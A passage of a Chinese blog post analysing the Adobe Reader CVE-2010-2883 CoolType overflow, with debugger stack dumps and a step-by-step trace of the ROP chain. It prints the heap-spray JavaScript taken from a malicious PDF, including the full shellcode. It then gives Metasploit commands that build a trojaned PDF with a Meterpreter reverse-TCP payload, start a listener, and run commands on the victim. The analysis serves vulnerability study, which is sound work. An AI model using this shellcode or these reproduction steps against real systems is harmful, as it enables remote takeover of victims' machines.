 DE9ECBA3</span><br><span class="line">0012E68C   4D8B6F39</span><br><span class="line">0012E690   FB1434A8</span><br><span class="line">0012E694   DEBE10B8</span><br><span class="line">0012E698   278F59DA</span><br><span class="line">0012E69C   5B56FD58</span><br><span class="line">0012E6A0   EE37AEB5</span><br><span class="line">0012E6A4   8D90D658</span><br><span class="line">0012E6A8   988C627A</span><br><span class="line">0012E6AC   C0408AC0</span><br><span class="line">0012E6B0   B13C2981</span><br><span class="line">0012E6B4   51C2A6B1</span><br><span class="line">0012E6B8   A24BE0AE</span><br><span class="line">0012E6BC   69D141AC</span><br><span class="line">0012E6C0   F447C59E</span><br><span class="line">0012E6C4   71728A52</span><br><span class="line">0012E6C8   2ED06524</span><br><span class="line">0012E6CC   0E5F30D5</span><br><span class="line">0012E6D0   4A80CB38  返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C49</span><br><span class="line">0012E6D4   D72ADDAB</span><br><span class="line">0012E6D8   F19E30A5</span><br><span class="line">0012E6DC   D4E4768E</span><br><span class="line">0012E6E0   F504F59B</span><br><span class="line">0012E6E4   2AF6A44D</span><br><span class="line">0012E6E8   FF90C804</span><br><span class="line">0012E6EC   782C1027</span><br><span class="line">0012E6F0   728BE679</span><br><span class="line">0012E6F4   D104C9D1</span><br><span class="line">0012E6F8   B88A2B3A</span><br><span class="line">0012E6FC   CA52A341</span><br><span class="line">0012E700   0F5A6147</span><br><span class="line">0012E704   C5B9526E</span><br><span class="line">0012E708   BB6B35E4</span><br><span class="line">0012E70C   47A3EB92  指向下一个 SEH 记录的指针</span><br><span class="line">0012E710   F7267FFE  SE处理程序</span><br><span class="line">0012E714   0000006C</span><br></pre></td></tr></table></figure>

<p>继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。溢出发生之后继续f8调试，发现程序在指令call 08016bde之后跑飞，则推测该函数中执行漏洞利用指令，故进入该函数分析。<br><a href="https://imgtu.com/i/6KNOn1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KNOn1.png" alt="6KNOn1.png"></a><br>继续f8调试，发现程序在指令call 0801BB21之后跑飞，则推测该函数中执行漏洞利用指令，故进入该函数分析。<br><a href="https://imgtu.com/i/6KNztO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KNztO.png" alt="6KNztO.png"></a><br>函数0801bb21中，程序在地址0801bb41处跑飞，跟进该函数。<br><a href="https://imgtu.com/i/6KUUCF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KUUCF.png" alt="6KUUCF.png"></a><br>函数0801bb41中，程序在地址0808b308处跑飞，跟进该函数。<br><a href="https://imgtu.com/i/6KafiT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KafiT.png" alt="6KafiT.png"></a><br>f7跟进0808b308地址处的指令，发现第一个rop块，此时程序执行流程已经被改变，分析原因发现地址0x0808b308处的指令为call [eax]，此时eax为0x0012e6d0，而在strcat产生溢出的过程中，内存地址0x12e4d8之后的内存会被覆盖，所以地址0x0012e6d0处的内存可以被修改，从而产生了进程劫持的可能。<br><a href="https://imgtu.com/i/6Ka7LR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Ka7LR.png" alt="6Ka7LR.png"></a><br>这里的leave指令相当于mov esp,ebp pop ebp，该指令执行完成后栈顶被重新设置为12e4e0，该部分内存也已经被溢出覆盖，使得程序可以继续顺着rop链执行。<br>第二个rop块是将esp设置为0c0c0c0c，漏洞利用过程中使用了堆喷射技术，通过该rop块，将栈顶修改为0c0c0c0c，从而完全掌握栈的控制权。<br><a href="https://imgtu.com/i/6KdVfS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KdVfS.png" alt="6KdVfS.png"></a><br>借助PDFStreamDumper工具提取样本中这段实现堆喷射的JS代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var var_shellcode = </span><br><span class="line">unescape( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ub5ba%uda4b%udd0e%ud9c1%u2474%u5ef4%uc933%u31b1%u5631%u0313%u1356%uee83%ua949%uf22f%uac59%u0bd0%ud199%uee59%ud1a8%u7a3e%ue19a%u2e35%u8916%udb18%uffad%uecb4%ub506%uc3e2%ue697%u42d7%uf51b%ua50b%u3622%ua45e%u2b63%uf493%u273c%ue906%u7d49%u829b%u9301%u779b%u92d1%u298a%ucd6a%ucb0c%u65bf%ud305%u40dc%u68df%u3e16%ub8de%ubf67%u854d%u3248%uc18f%uad6e%u3bfa%u508d%ufffd%u8eec%u1b88%u4456%uc02a%u8967%u83ad%u666b%uccb9%u796f%u676e%uf28b%ua891%u401a%u6cb6%u1247%u35d7%uf52d%u26e8%uaa8e%u2c4c%ube22%u6ffc%u4128%u0a72%u411e%u158c%u2a0e%u9ebd%u2dc1%u7542%uc2a6%ud408%u4a8e%u8cd5%u1693%u7ae6%u2ed7%u8f65%ud4a7%ufa75%u91a2%u1631%u8ade%u18d7%uaa4d%u7afd%u3810%u529d%ub8b7%uab04&apos; );</span><br><span class="line">var var_c = unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (var_c.length + 20 + 8 &lt; 0x10000) var_c+=var_c;</span><br><span class="line">var_b = var_c.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">var_b += var_shellcode;</span><br><span class="line">var_b += var_c;</span><br><span class="line">var_d = var_b.substring(0, 0x10000/2);</span><br><span class="line">while(var_d.length &lt; 0x80000) var_d += var_d;</span><br><span class="line">var_3 = var_d.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var var_4 = new Array();</span><br><span class="line">for (var_i=0;var_i&lt;0x1f0;var_i++) var_4[var_i]=var_3+&quot;s&quot;;</span><br></pre></td></tr></table></figure>

<p>所有的ShellCode都被转化为了十六进制的转义序列，经过unescape解码之后存储在var_shellcode之中，var_c变量存储了%u0c0c%u0c0c，接下来用了一个while循环叠加var_c，用来覆盖内存的数据。<br>采用0x0c0c0c0c作为滑板指令的原因是因为它对应的指令是or al,0x0C，这样的指令执行的效果对al寄存器不会产生任何影响<br>接下来的var_b保存了前面是所有滑板指令以及ShellCode，最关键的实现堆喷射的语句是new Array()，利用数据来开辟内存区域，然后通过填充数据的方式来喷射ShellCode。<br>继续调试，rop3这里借原本存“UTF-32”字符串的地方保存eax的值，然后再次返回。<br><a href="https://imgtu.com/i/6Kwt4f" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Kwt4f.png" alt="6Kwt4f.png"></a><br>eax指向CreateFileA函数，疑似之后需要调用该函数。<br><a href="https://imgtu.com/i/6KrhJx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KrhJx.png" alt="6KrhJx.png"></a><br>然后返回去跳转执行CreateFileA，我们直接查看CreateFileA在栈区的参数。<br><a href="https://imgtu.com/i/6KrXFI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KrXFI.png" alt="6KrXFI.png"></a><br>这里以隐藏的方式创建了一个临时文件，文件名为iso88591，可以在当前样本的同路径下找到。<br><a href="https://imgtu.com/i/6KsPmQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KsPmQ.png" alt="6KsPmQ.png"></a><br>这里会跳转到0x4A8063A5，然后将ecx赋值为4A801064，接着跳转到0x4A842DB2。<br><a href="https://imgtu.com/i/6KsepV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KsepV.png" alt="6KsepV.png"></a><br>交换eax和edi寄存器的值，接着跳转到0x4A802AB1。<br><a href="https://imgtu.com/i/6Ksl79" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Ksl79.png" alt="6Ksl79.png"></a><br>ebx为0x8，跳转到0x4A80A8A6。<br><a href="https://imgtu.com/i/6Kst1K" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Kst1K.png" alt="6Kst1K.png"></a><br>继续跳转。<br><a href="https://imgtu.com/i/6KsWng" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KsWng.png" alt="6KsWng.png"></a><br>eax指向了CreateFileMappingA函数。<br><a href="https://imgtu.com/i/6KsINn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KsINn.png" alt="6KsINn.png"></a><br>接着用相同的方法调用CreateFileMappingA，创建文件映射对象。<br><a href="https://imgtu.com/i/6KyS41" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KyS41.png" alt="6KyS41.png"></a><br>经过几次跳转，然后去执行MapViewOfFile，将一个文件映射对象映射到当前程序的地址空间。<br><a href="https://imgtu.com/i/6KyijO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KyijO.png" alt="6KyijO.png"></a><br>参数如下：<br><a href="https://imgtu.com/i/6KyuCt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KyuCt.png" alt="6KyuCt.png"></a><br>然后用类似的方法去调用memcpy。<br><a href="https://imgtu.com/i/6Ky2P1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6Ky2P1.png" alt="6Ky2P1.png"></a><br>将要执行的ShellCode写入到MapViewOfFile返回的地址，因为这段内存是可读可写的，所以就绕过了DEP的保护由于构造的ROP链指令均位于不受ASLR保护的icucnv32.dll模块，因此也绕过了ASLR。接着去执行ShellCode<br><a href="https://imgtu.com/i/6KywvT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KywvT.png" alt="6KywvT.png"></a></p>
<h2 id="5、漏洞复现"><a href="#5、漏洞复现" class="headerlink" title="5、漏洞复现"></a>5、漏洞复现</h2><p>搜索Adobe渗透模块 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search adobe_cooltype_sing</span><br></pre></td></tr></table></figure>

<p>调用渗透模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing/</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/6K6LTJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6K6LTJ.png" alt="6K6LTJ.png"></a><br>调用meterpreter载荷，反向连接到渗透机 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; exploit(adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>设置Kali Linux的IP地址 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; exploit(adobe_cooltype_sing) &gt; set LHOST 192.168.1.xxx</span><br></pre></td></tr></table></figure>

<p>设置本地监听端口 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; exploit(adobe_cooltype_sing) &gt; set LPORT 8888</span><br></pre></td></tr></table></figure>

<p>设置带有后门程序的PDF文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; exploit(adobe_cooltype_sing) &gt; set FILENAME</span><br><span class="line">cve-2010-2883.pdf</span><br></pre></td></tr></table></figure>

<p>执行渗透生成文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; exploit(adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/6KguCR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KguCR.png" alt="6KguCR.png"></a><br>使用handler监听模块 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>

<p>回弹一个tcp连接 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf  exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>

<p>设置监听IP地址（跟PDF木马文件一致） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf  exploit(handler) &gt; set LHOST 192.168.1.xxx</span><br></pre></td></tr></table></figure>

<p>设置监听的端口（跟PDF木马文件一致） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf  exploit(handler) &gt; set LPORT 8888</span><br></pre></td></tr></table></figure>

<p>开启监听 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf  exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/6KRo4J" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6KRo4J.png" alt="6KRo4J.png"></a><br>查看系统信息 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br></pre></td></tr></table></figure>

<p>查看当前用户 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>

<p>截屏 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/6K4ADx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/03/07/6K4ADx.png" alt="6K4ADx.png"></a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/03/14/二进制各种漏洞原理/" rel="next" title="二进制各种漏洞原理">
                <i class="fa fa-chevron-left"></i> 二进制各种漏洞原理
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="pang4ea">
            
              <p class="site-author-name" itemprop="name">pang4ea</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">49</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://stackoverflow.com/yourname" target="_blank" title="StackOverflow">
                      
                        <i class="fa fa-fw fa-stack-overflow"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="skype:yourname?call|chat" target="_blank" title="Skype">
                      
                        <i class="fa fa-fw fa-skype"></i></a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、漏洞描述"><span class="nav-number">1.</span> <span class="nav-text">1、漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、分析环境"><span class="nav-number">2.</span> <span class="nav-text">2、分析环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、定位漏洞位置"><span class="nav-number">3.</span> <span class="nav-text">3、定位漏洞位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、动态调试"><span class="nav-number">4.</span> <span class="nav-text">4、动态调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、漏洞复现"><span class="nav-number">5.</span> <span class="nav-text">5、漏洞复现</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">pang4ea</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  


<script type="text/javascript" src="https://blog-static.cnblogs.com/files/ioufev/love.js"></script>


<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>